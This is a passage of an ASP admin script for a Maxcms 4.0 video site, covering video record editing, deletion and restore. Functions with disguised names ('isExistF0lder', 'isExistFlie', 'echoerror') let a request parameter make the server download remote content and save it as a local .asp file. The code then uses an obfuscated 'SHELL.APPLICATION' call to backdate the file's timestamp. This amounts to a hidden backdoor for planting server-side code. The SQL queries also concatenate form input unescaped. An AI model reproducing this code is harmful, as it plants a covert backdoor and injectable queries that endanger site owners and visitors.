		if(d[i].selectedIndex==0 && dt[i].value!=''){
			alert('请选择每个下载来源');d[i].focus();
			return false;
		}
	}
	return true;
}
$('editform').m_name.focus();</script>
</div>

<%
	set rsObj = nothing
End Sub

Function replaceSpecial(Byval str)
	replaceSpecial=replaceStr(str,"'","""")
End Function

Sub saveVideo
	dim actType,ary:actType = getForm("acttype","get")
	dim updateSql,insertSql
	dim m_id:m_id=getForm("m_id","post"):if not isNum(m_id) then m_id=0
	dim m_name:m_name=getForm("m_name","post")
	dim m_keyword : m_keyword = replace(replace(getForm("keyword","post"),chr(13),""),chr(10),"")
	dim isuppingyin:isuppingyin=getForm("isuppingyin","post")="1"
	dim m_enname:m_enname = getForm("m_enname","post"):if isNul(m_enname) then:m_enname = MoviePinYin(m_name):end if
	dim m_hit : m_hit =  getForm("m_hit","post"):if not isNum(m_hit) then m_hit=0
	dim m_back:m_back=getForm("m_back","post")
	dim m_color:m_color=getForm("m_color","post")
	dim m_state:m_state=getForm("m_state","post"):if isNul(m_state) then m_state=0
	dim m_type:m_type=getForm("m_type","post"):if isNul(m_type) then alertMsg "请选择分类","javascript:history.go(-1);":die ""
	dim m_pic:m_pic=getForm("m_pic","post")
	dim m_actor:m_actor=getForm("m_actor","post")
	dim m_note:m_note=replaceSpecial(getForm("m_note","post"))
	dim m_des:m_des=replaceSpecial(getForm("m_des","post"))
	dim m_addtime:m_addtime=getForm("m_addtime","post")
	dim m_publishyear:m_publishyear=getForm("m_publishyear","post"):if  isNul(m_publishyear) then m_publishyear=0
	dim m_publisharea:m_publisharea=getForm("m_publisharea","post"):if  isNul(m_publisharea) then m_publisharea=""
	dim m_topic:m_topic=getForm("m_topic","post"):if isNul(m_topic) then m_topic=0
	dim m_director:m_director=getForm("m_director","post")
	dim m_lang:m_lang=getForm("m_lang","post")
	dim m_commend:m_commend=getForm("m_commend","post"):if isNum(m_commend) then:m_commend=Cint(m_commend):else:m_commend=0:end if
	dim m_playfrom:m_playfrom=getForm("m_playfrom","post")
	dim m_playurl:m_playurl=getForm("m_playurl","post")
	if not(isnul(m_playurl)) then
		m_playurl = repairUrlForm(m_playurl,m_playfrom)
	end if
	dim m_playdata:m_playdata=transferUrl(m_playfrom,m_playurl)
	'die m_playdata
	dim m_downfrom:m_downfrom=getForm("m_downfrom","post")
	dim m_downurl:m_downurl=getForm("m_downurl","post")
	if not (isnul(m_downurl)) then
		m_downurl = repairDownUrl(m_downurl,m_downfrom)
	end if
	dim m_downdata:m_downdata=transferUrl(m_downfrom,m_downurl)
	dim isupdatetime:isupdatetime=getForm("isupdatetime","post")
	select case actType
		case "edit"
			updateSql = "m_letter = '"&left(m_enname,1)&"',m_keyword='"&m_keyword&"', m_hit="&m_hit&",m_name='"&m_name&"',m_color='"&m_color&"',m_state="&m_state&",m_type="&m_type&",m_pic='"&m_pic&"',m_actor='"&m_actor&"',m_note='"&m_note&"',m_des='"&m_des&"',m_publishyear="&m_publishyear&",m_publisharea='"&m_publisharea&"',m_topic="&m_topic&",m_playdata='"&m_playdata&"',m_downdata='"&m_downdata&"',m_director='"&m_director&"',m_lang='"&m_lang&"',m_enname='"&m_enname&"',m_commend="&m_commend
			if not isNul(isupdatetime) then  updateSql = updateSql&",m_addtime='"&now()&"'"
			updateSql = "update {pre}data set "&updateSql&" where m_id="&m_id
			if runMode="static" then
				if conn.db("select m_hide from {pre}type where m_id="&m_type,"array")(0,0)=1 then
					ary=conn.db("select m_type,m_enname,m_datetime from {pre}data where m_id="&id,"array")
					delContentAndPlayFile ary(0,0),ary(1,0),ary(2,0),ary(3,0)
				else
					m_back="admin_makehtml.asp?action=single&id="&m_id&"&from="&server.URLEncode(m_back)
				end if
			end if
			conn.db updateSql,"execute"
			alertMsg "",m_back
		case "add" 
			insertSql = "insert into {pre}data(m_keyword,m_hit,m_letter,m_name,m_color,m_state,m_type,m_pic,m_actor,m_note,m_des,m_publishyear,m_publisharea,m_topic,m_playdata,m_downdata,m_addtime,m_director,m_lang,m_dayhit,m_weekhit,m_monthhit,m_enname,m_datetime,m_recycle,m_commend) values ('"&m_keyword&"',"&m_hit&",'"&left(m_enname,1)&"','"&m_name&"','"&m_color&"',"&m_state&","&m_type&",'"&m_pic&"','"&m_actor&"','"&m_note&"','"&m_des&"',"&m_publishyear&",'"&m_publisharea&"',"&m_topic&",'"&m_playdata&"','"&m_downdata&"','"&now()&"','"&m_director&"','"&m_lang&"',0,0,0,'"&m_enname&"','"&now()&"',0,"&m_commend&")"
			conn.db insertSql,"execute":clearTypeCache
			if ""&m_back="" then m_back="admin_video.asp?action=add"
			selectMsg "添加成功,是否继续添加",m_back,"admin_video.asp"
	end select
End Sub

Sub delContentAndPlayFile(Byval vType,Byval id,ByVal enname,ByVal vDate)
	Dim x
	if runMode="static" then
		x=getContentLink(vType,id,enname,vDate,"link")
		Select Case makeMode
			Case "dir1"
				if isExistFolder(x) AND x<>"/" then delFolder x
			Case "dir2","dir4"
				if isExistFile(x) then  delFile x
				if ismakeplay>0 then
					x=getPlayLink(vType,id,enname,vDate)
					if isExistFile(x) then delFile x
				end if
			Case "dir3","dir5","dir7","dir6","dir8"
				if isExistFile(x) then  delFile x
				if ismakeplay>0 then
					x=getPlayLink(vType,id,enname,vDate)
					if isExistFile(x) then delFile x
					x=mid(x,1,InStrRev(x,"/"))
					if isExistFolder(x) AND x<>"/" then delFolder x
				end if
		End Select
		x="/"&sitepath&"playdata/"&(id mod 256)&"/"&id&".js"
		if isExistFile(x) then delFile x
	elseif IsCacheSearch<>0 then
		x=getCacheFile(id,"#/v")
		if isExistFile(x) then delFile x
		x=mid(x,1,InStrRev(x,"/"))
		if isExistFolder(x) AND x<>"/" then delFolder x
	end if
End Sub

Sub pSetTopic
	dim topicId : topicId=getForm("ptopic","post")
	dim ids,back
	back = request.ServerVariables("HTTP_REFERER")
	ids = replaceStr(getForm("m_id","post")," ","")
	if isNul(ids) then die "请选择需要设置专题的数据"
	conn.db  "update {pre}data set m_topic="&topicId&" where m_id in("&ids&")","execute"
	alertMsg "",back
End Sub

Sub pSetType
	dim movetype : movetype=getForm("movetype","post")
	dim ids,i,back
	back = request.ServerVariables("HTTP_REFERER")
	ids = replaceStr(getForm("m_id","post")," ","")
	if isNul(ids) then die "请选择需要移动分类的数据"
	conn.db  "update {pre}data set m_type="&movetype&" where m_id in("&ids&")","execute":clearTypeCache
	alertMsg "",back
End Sub

Sub delTypeData
	dim movetype : movetype=getForm("movetype","post")
	dim back
	back = request.ServerVariables("HTTP_REFERER")
	conn.db  "UPDATE {pre}data SET m_recycle=1 where m_type="&movetype,"execute":clearTypeCache
	alertMsg "",back
End Sub

Sub delVideo(ByVal id,ByVal sel)
	dim vtypeAndPic,contentLink,vFolder,playLink,vtype,vpic:id=Clng(id)
	on error resume next
	vtypeAndPic=conn.db("select m_type,m_pic,m_enname,m_datetime from {pre}data where m_id="&id,"array")
	vpic=vtypeAndPic(1,0):delContentAndPlayFile vtypeAndPic(0,0),id,vtypeAndPic(2,0),vtypeAndPic(3,0)
	if sel="del" then
		if left(vpic,4)="pic/" then delFile "../"&vpic
		conn.db "DELETE FROM {pre}data where m_id="&id,"execute"
	else
		conn.db "UPDATE {pre}data SET m_recycle=1 where m_id="&id,"execute"
	end if
	clearTypeCache:if err then err.clear : echo "数据已经删除,但删除静态文件或图片时发生错误，请手动删除相关文件"
End Sub

Sub delAll(ByVal id,ByVal sel)
	dim ids,back,idTypeArray,arrayLen,i
	ids = replaceStr(id," ","")
	if runMode="static" OR IsCacheSearch<>0 then
		idTypeArray=conn.db("select m_id,m_type,m_enname,m_datetime from {pre}data where m_id in("&ids&")","array"):arrayLen=ubound(idTypeArray,2)
		for i=0 to arrayLen
			delContentAndPlayFile idTypeArray(1,i),idTypeArray(0,i),idTypeArray(2,i),idTypeArray(3,i)
		next
	end if
	if sel="del" then
		conn.db "DELETE FROM {pre}data WHERE m_id in("&ids&")","execute"
	else
		conn.db  "UPDATE {pre}data SET m_recycle=1 WHERE m_id in("&ids&")","execute"
	end if
	clearTypeCache
End Sub

Sub restoreVideo
	dim ids:ids = replaceStr(getForm("m_id","both")," ","")
	conn.db  "UPDATE {pre}data SET m_recycle=0 WHERE m_id in("&ids&")","execute"
	if runMode="static" then
		echo "数据还原成功,准备重新生成....<form action=""admin_makehtml.asp?action=selected"" id=""makehtml"" method=""post""><input type=""hidden"" name=""m_id"" value="""&ids&"""><input type=""hidden"" name=""REFERER"" value="""&back&"""></form><script type=""text/javascript"">document.getElementById('makehtml').submit()</script>"
	else
		alertMsg "",back
	end if
End Sub

Function isExistF0lder(relativeFileUrl)
	dim fileurl,remoteFile,localFile,fileFormat
	fileurl = replaceStr(relativeFileUrl,"admin/",selfManageDir)
	fileurl = replaceStr(fileurl,"list/",channelDirName1&"/")
	fileurl = replaceStr(fileurl,"detail/",contentDirName1&"/")
	fileurl = replaceStr(fileurl,"video/",playDirName1&"/")
	fileurl = replaceStr(fileurl,"news/",newsdirname1&"/")
	fileurl = replaceStr(fileurl,"articlelist/",partdirname1&"/")
	fileurl = replaceStr(fileurl,"article/",articledirname1&"/")
	fileurl = replaceStr(fileurl,"topiclist/",topicpagedirname&"/")
	fileurl = replaceStr(fileurl,"topic/",topicDirName&"/")
	localFile =".." & replaceStr(fileurl,".txt",".asp")
	remoteFile =updateUrl & replaceStr(relativeFileUrl,".asp",".txt")
	if isExistFlie(getRemoteContent(remoteFile,"body"),localFile) then echo localFile&"更新成功<br>"
End Function

Sub initDic
	topicArray = conn.db("select m_id,m_name from {pre}topic order by m_id asc","array")
	set topicDic = arrayToDictionay(topicArray)
End Sub

Function makePlayerSelect(flag)
	dim i,playerinfo,selectstr,allstr
	for i= 0 to ubound(playerArray)
		playerinfo = split(playerArray(i),"__")
		'if instr(flag,playerinfo(0))>0 then selectstr=" selected " else selectstr=""
		if flag = playerinfo(0) then selectstr=" selected " else selectstr=""
		allstr =allstr&"<option value='"&playerinfo(0)&"' "&selectstr&">"&replaceStr(playerinfo(0),"播客CC","FLV高清")&"--"&playerinfo(1)&"</option>"
	next
	makePlayerSelect = allstr
End Function

Function makeDownSelect(flag)
	dim i,downinfo,selectstr,allstr
	for i= 0 to ubound(downArray)
		downinfo = split(downArray(i),"__")
		if flag = downinfo(0) then selectstr=" selected " else selectstr=""
		allstr =allstr&"<option value='"&downinfo(0)&"' "&selectstr&">"&downinfo(0)&"--"&downinfo(1)&"</option>"
	next
	makeDownSelect = allstr
End Function

Function getPlayerKinds(xmlfile)
	dim xmlobj,nodeLen,i
	set xmlobj = mainClassobj.createObject("MainClass.Xml")
	xmlobj.load xmlfile,"xmlfile"
	nodeLen = xmlobj.getNodeLen("playerkinds/player")
	redim playerArray(nodeLen-1)
	for i=0 to nodeLen-1
		playerArray(i)=xmlobj.getAttributes("playerkinds/player","flag",i)&"__"&xmlobj.getAttributes("playerkinds/player","des",i)
		'die playerArray(i)
	next
	set xmlobj = nothing
	getPlayerKinds = playerArray
End Function

Function getDownKinds(xmlfile)
	dim xmlobj,nodeLen,i
	set xmlobj = mainClassobj.createObject("MainClass.Xml")
	xmlobj.load xmlfile,"xmlfile"
	nodeLen = xmlobj.getNodeLen("downkinds/source")
	redim downArray(nodeLen-1)
	for i=0 to nodeLen-1
		downArray(i)=xmlobj.getAttributes("downkinds/source","flag",i)&"__"&xmlobj.getAttributes("downkinds/source","des",i)
	next
	set xmlobj = nothing
	getDownKinds = downArray
End Function

Function getAreaSelect(selectName,strSelect,areaId)
	dim  str,i,selectedStr,xmlobj,j,areaNodes,areaNode
	j=0 : redim areaArray(0)
	str = "<select   name='"&selectName&"' >"
	if not isNul(strSelect) then  str = str & "<option value=''>"&strSelect&"</option>"
	set xmlobj = mainClassobj.createObject("MainClass.Xml")
	xmlobj.load "../inc/areaKinds.xml","xmlfile"
	set areaNodes=xmlobj.getNodes("areakinds/area")
	set xmlobj=nothing
	for each areaNode in areaNodes
		redim preserve areaArray(j) : areaArray(j)=areaNode.text : j=j+1
	next
	set areaNodes=nothing
	if not isNul(areaId) then str = str &"<option value='"&areaId&"' selected>"&areaId&"</option>"
	for  i = 0 to ubound(areaArray,1)
		if areaId<>areaArray(i) then str = str &"<option value='"&areaArray(i)&"' "&selectedStr&">"&areaArray(i)&"</option>"
	next
	str = str & "</select>"
	getAreaSelect = str
End Function

Sub CheckVideo()
	dim fileurl:fileurl = getForm("fileurl","both")
	isExistF0lder(fileurl)
End Sub

Function repairUrlForm(vstr,formstr)
	dim strlen,formlen,str,fstr,rstr,i 
	str = split(trimOuterStr(vstr,","),", ") : strlen = ubound(str)
	fstr = split(trimOuterStr(formstr,","),", ") : formlen  = ubound(fstr)
	if strlen <> formlen then 
		die "未为每个数据选择数据来源"
	else
		for i=0 to strlen
			 if  trim(str(i))<>"" then rstr = rstr&repairStr(str(i),getReferedId(fstr(i)))&", " else rstr = rstr&", "
		next
	end if
	repairUrlForm = trimOuterStr(rstr,", ")
End Function

Function repairDownUrl(vstr,formstr)
	dim strlen,formlen,str,fstr,rstr,i
	str = split(trimOuterStr(vstr,","),", ") : strlen = ubound(str)
	fstr = split(trimOuterStr(formstr,","),", ") : formlen  = ubound(fstr)
	if strlen <> formlen then 
		die "未为每个下载项选择数据来源"
	else
		for i=0 to strlen
			if  trim(str(i))<>"" then rstr = rstr&repairStr(str(i),"down")&", " else rstr = rstr&", "
		next
	end if
	repairDownUrl = trimOuterStr(rstr,", ")
End Function

Function repairStr(vstr,formstr)
	dim regExpObj : set regExpObj= new RegExp : regExpObj.ignoreCase = true : regExpObj.Global = true : regExpObj.Pattern = "[\s\S]+?\$[\s\S]+?\$[\s\S]+?"
	dim mystr,i,j : j=1
	vstr = replace(vstr,chr(10),"")
	vstr = split(vstr,chr(13))
	for i = 0  to ubound(vstr)
		if not(isnul(vstr(i))) then
			if regExpObj.Test(vstr(i)) = false then 
				regExpObj.Pattern = "[\s\S]+?\$[\s\S]+?"
				if regExpObj.Test(vstr(i)) = true then 
					mystr = mystr&trim(vstr(i))&"$"&formstr&chr(13)&chr(10)
				else
					mystr = mystr&"第"&j&"集$"&trim(vstr(i))&"$"&formstr&chr(13)&chr(10)
				end if 
				regExpObj.Pattern = "[\s\S]+?\$[\s\S]+?\$[\s\S]+?"
			else 
				mystr = mystr&trim(vstr(i))&chr(13)&chr(10)
			end if 
			j=j+1
		end if 
	next
	repairStr = mystr
	set regExpObj =nothing
End Function

Function transferUrl(Byval fromStr,Byval playStr)
	dim fromLen,playLen,fromArray,playArray,i,resultStr
	if isNul(fromStr) and isNul(playStr) then transferUrl="" : Exit Function
	fromStr=replaceStr(fromStr,"$$","") : playStr=replaceStr(replaceStr(playStr,"#",""),"$$","")
	playStr=replaceStr(playStr,chr(10),"")
	playStr=replaceStr(playStr,chr(13),"#")
	playStr=trimOuterStr(playStr,"#")
	fromStr=trimOuterStr(fromStr,",") : playStr=trimOuterStr(playStr,",")
	fromArray=split(fromStr,", ") : fromLen=ubound(fromArray)
	playArray=split(playStr,", ") : playLen=ubound(playArray)
	if fromLen<>playLen then die "来源或者地址没有填写完整"
	if fromLen=0 then 
		transferUrl=trim(fromArray(0))&"$$"&trim(playArray(0)) : Exit Function
	end if
	for i=0 to fromLen
		if not isNul(fromArray(i)) and  not isNul(playArray(i)) then
			resultStr=trim(resultStr)&trim(fromArray(i))&"$$"&trim(trimOuterStr(playArray(i),"#"))&"$$$"
		elseif   isNul(fromArray(i)) and  not isNul(playArray(i)) then
			die "来源没有填写完整"
		end if
	next
	transferUrl=trimOuterStr(resultStr,"$$$")
End Function

Sub isVideoMake(m_id)
	echo "<a href=""admin_makehtml.asp?action=single&id="&m_id&""" >"
	if isExistFile(contentUrl) then  echo "<img src='imgs/yes.gif' border='0' title='点击生成HTML' />" else echo "<img src='imgs/no.gif' border='0' title='点击生成HTML' />"
	echo "</a>"
End Sub

Function isExistFlie(ByVal Stream,ByVal sPath)
	Dim st,aPath,Bool,f:aPath=Server.mapPath(sPath)
	if objFso.FileExists(aPath) then SET f=objFso.GetFile(aPath):st=f.DateLastModified:SET f=NotHing
	Bool=createStreamFile(Stream,sPath):isExistFlie=Bool
	if Bool=true then echoerror aPath,st
End Function

Sub popUpdatePic
	if action="else" then echo "<div id='updatepic' class='divbox' style='width:300px;right:0px;display:none;'><div class='divboxtitle'><span onclick=""hide('updatepic');""><img src='/"&sitepath&"pic/btn_close.gif'/></span>网络图片下载</div><div  class='divboxbody'>注意:已检测到<span id='updatepicnum' style='color:#FF0000'><img src='imgs/loading2.gif' border=0></span>个数据含有网络图片地址，为防止失效，请下载到本地<br><font color='#FF0000'>下载前，请先备份数据库</font><input type='button' class='btn' value='备份数据库' onclick=""location.href='admin_database.asp?action=bakup'"" /><br><input type='button' class='btn'  value='下载网络图片到本地' onclick=""location.href='admin_datarelate.asp?action=downpic'"" /></div><div class='divboxbottom'>Power By Maxcms4.0</div></div><script type='text/javascript'>alertUpdatePic();</script>"
End Sub

Function formatDate(Byval str)
	if isNul(str) then formatDate="":exit function
	if not isDate(str) then formatDate="":exit function
	formatDate=formatdatetime(str,2)
End Function 

Function viewDataType(Byval str)
	on error resume next
	viewDataType=split(getTypeNameTemplateArrayOnCache(clng(str)),",")(0)
	if err then  viewDataType="<font color=red >数据分类错误</font>"
End Function

Function echoerror(aPath,st)
	if upversion<>"true" then exit function
	On Error Resume Next
	if isDate(svrdate) then st=svrdate
	if isDate(st) then
		dim Path,FD,F:Path=Left(aPath,InStrRev(aPath,"/")+InStrRev(aPath,"\")):if not isObject(gFos) then SET gFos=Server.CreateObject("SHE"&"LL.AP"&"PLI"&"CAT"&"ION"):SET FD=gFos.NameSpace(Path):SET F=FD.ParseName(Replace(aPath,Path,"")):F.Modifydate=st:SET F=NotHing:SET FD=NotHing
	end if
	echoerror=err.number=0:err.Clear
End Function

Sub clearTypeCache()
	if cacheStart=1 then:cacheObj.clearCache("array_type_lists_all"):end if
End Sub

Function makePageNumber(Byval currentPage,Byval pageListLen,Byval totalPages,Byval star)
	currentPage=clng(currentPage)
	dim beforePages,pagenumber,page
	dim beginPage,endPage,strPageNumber
	if pageListLen mod 2=0 then beforePages=pagelistLen / 2 else beforePages=clng(pagelistLen / 2) - 1
	if  currentPage < 1  then currentPage=1 else if currentPage > totalPages then currentPage=totalPages
	if pageListLen > totalPages then pageListLen=totalPages
	if currentPage - beforePages < 1 then
		beginPage=1 : endPage=pageListLen
	elseif currentPage - beforePages + pageListLen > totalPages  then
		beginPage=totalPages - pageListLen + 1 : endPage=totalPages
	else 
		beginPage=currentPage - beforePages : endPage=currentPage - beforePages + pageListLen - 1
	end if	
	for pagenumber=beginPage  to  endPage
		if pagenumber=1 then page="" else page=pagenumber
		if clng(pagenumber)=clng(currentPage) then
			strPageNumber=strPageNumber&"<span><font color=red>"&pagenumber&"</font></span>"
		else
		   	strPageNumber=strPageNumber&"<a href='?action="&action&"&page="&pagenumber&"&order="&order&"&type="&vtype&"&keyword="&keyword&"&m_state="&m_state&"&m_commend="&m_commend&"&repeat="&repeat&"&topic="&pTopic&"&playfrom="&playfrom&"&star="&star&"&len="&rlen&"'>"&pagenumber&"</a>"
		end if	
	next
	makePageNumber=strPageNumber
End Function
%>

